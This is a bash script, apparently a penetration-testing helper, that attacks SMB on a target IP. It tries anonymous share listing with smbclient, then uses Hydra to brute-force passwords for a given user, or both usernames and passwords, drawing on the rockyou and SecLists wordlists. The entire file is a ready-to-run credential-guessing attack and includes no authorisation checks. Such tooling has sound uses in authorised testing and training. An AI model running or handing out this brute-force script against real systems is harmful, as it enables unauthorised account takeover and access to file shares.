#!/bin/bash

# Usage: ./smb.sh <IP_ADDRESS> <CHOICE> [USERNAME]
# <CHOICE> can be:
# 1 - Anonymous login only
# 2 - Password breaking (requires a username as the third parameter)
# 3 - Username and password breaking (brute-force both)

if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <IP_ADDRESS> <CHOICE> [USERNAME]"
  echo "<CHOICE>: 1 - Anonymous login, 2 - Password breaking (username required), 3 - Username and password breaking"
  exit 1
fi

# Variables
OUTPUT_DIR="scan_results_smb"
TEXT_OUTPUT="$OUTPUT_DIR/smb.txt"
IP_ADDRESS=$1        # The IP address is the first argument
CHOICE=$2            # The action choice (1, 2, or 3) is the second argument
WORDLIST="/usr/share/wordlists/rockyou.txt"  # Path to the password wordlist file
USERLIST="/usr/share/seclists/Usernames/top-usernames.txt"  # Common usernames from SecLists

# Create a directory to store results if it doesn't exist
mkdir -p $OUTPUT_DIR

# Handle the choice passed as an argument
case $CHOICE in
  1)
    # Option 1: Anonymous SMB login only
    echo "Attempting anonymous SMB login to $IP_ADDRESS..."

    # Using smbclient to attempt anonymous login
    smbclient -L \\$IP_ADDRESS -N > $TEXT_OUTPUT

    # Check if the login was successful by searching the output
    if grep -q "Anonymous login successful" $TEXT_OUTPUT || grep -q "NT_STATUS_OK" $TEXT_OUTPUT; then
      echo "Anonymous SMB login to $IP_ADDRESS succeeded!"
    else
      echo "Anonymous SMB login to $IP_ADDRESS failed."
    fi
    ;;

  2)
    # Option 2: Password breaking for a specific username
    if [ -z "$3" ]; then
      echo "Error: You must provide a username for password breaking in choice 2."
      echo "Usage: $0 <IP_ADDRESS> 2 <USERNAME>"
      exit 1
    fi
    username=$3
    echo "Starting password breaking for username $username on SMB..."

    # Using Hydra for brute-forcing passwords with a known username on SMB
    hydra -l $username -P $WORDLIST smb://$IP_ADDRESS -vV
    ;;

  3)
    # Option 3: Username and password brute-forcing on SMB
    echo "Starting username and password brute-forcing on SMB..."

    # Using Hydra to brute-force both usernames and passwords on SMB
    hydra -L $USERLIST -P $WORDLIST smb://$IP_ADDRESS -vV
    ;;

  *)
    # Invalid choice
    echo "Invalid choice! Please use 1 for anonymous login, 2 for password breaking, or 3 for username and password breaking."
    exit 1
    ;;
esac

# Clean up by removing the scan result text file
rm $TEXT_OUTPUT
